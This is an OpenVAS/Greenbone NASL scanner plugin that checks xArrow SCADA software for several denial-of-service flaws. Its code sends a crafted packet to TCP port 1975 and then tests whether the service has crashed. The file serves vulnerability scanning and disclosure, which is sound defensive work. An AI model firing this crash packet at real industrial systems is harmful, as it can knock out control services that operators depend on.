# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802635");
  script_version("2023-07-21T05:05:22+0000");
  script_cve_id("CVE-2012-2426", "CVE-2012-2427", "CVE-2012-2428", "CVE-2012-2429");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2012-06-07 11:11:11 +0530 (Thu, 07 Jun 2012)");
  script_name("xArrow Multiple Denial of Service Vulnerabilities");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(1975);

  script_xref(name:"URL", value:"http://secunia.com/advisories/48276");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52307");
  script_xref(name:"URL", value:"http://aluigi.org/adv/xarrow_1-adv.txt");
  script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICSA-12-145-02.pdf");
  script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-12-065-01.pdf");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to execute arbitrary code
  or cause the application to crash.");
  script_tag(name:"affected", value:"xArrow versions before 3.4.1");
  script_tag(name:"insight", value:"- A NULL-pointer dereference error in SCADA.exe due to missing validation
    when allocating memory can be exploited to cause a crash via a specially
    crafted packet sent to TCP port 1975.

  - An error in SCADA.exe when allocating memory to process certain packets
    can be exploited to cause limited memory corruption and crash the service
    via a specially crafted packet sent to TCP port 1975.

  - An integer overflow error in SCADA.exe when processing certain packets can
    be exploited to cause a crash via a specially crafted datagram sent to UDP
    port 1974.

  - An error in SCADA.exe when processing certain packets can be exploited to
    cause a crash via a specially crafted datagram sent to UDP port 1974.");
  script_tag(name:"solution", value:"Upgrade to xArrow version 3.4.1 or later.");
  script_tag(name:"summary", value:"xArrow is prone to multiple denial of service vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  script_xref(name:"URL", value:"http://www.xarrow.net/");
  exit(0);
}

port = 1975;
if(! get_port_state(port)){
  exit(0);
}

soc = open_sock_tcp(port);
if(! soc) {
  exit(0);
}

res = recv(socket:soc, length:1024);

if(res !~ '^\xeb\0x90\xeb\x90\xeb\x90*')
{
  close(soc);
  exit(0);
}

header = raw_string( 0xeb, 0x90, 0xeb, 0x90, 0xeb, 0x90, 0xa3, 0xa3, 0xa3,
                     0xa3, 0x38, 0x5c, 0x5c, 0x5c, 0x55, 0x8b, 0xcc, 0xb7);

req = header + crap(data: 'a', length: 100);

send(socket:soc, data:req);
res = recv(socket:soc, length:1024);
close(soc);

sleep(3);

soc1 = open_sock_tcp(port);
if(!soc1)
{
  security_message(port);
  exit(0);
}
close(soc1);
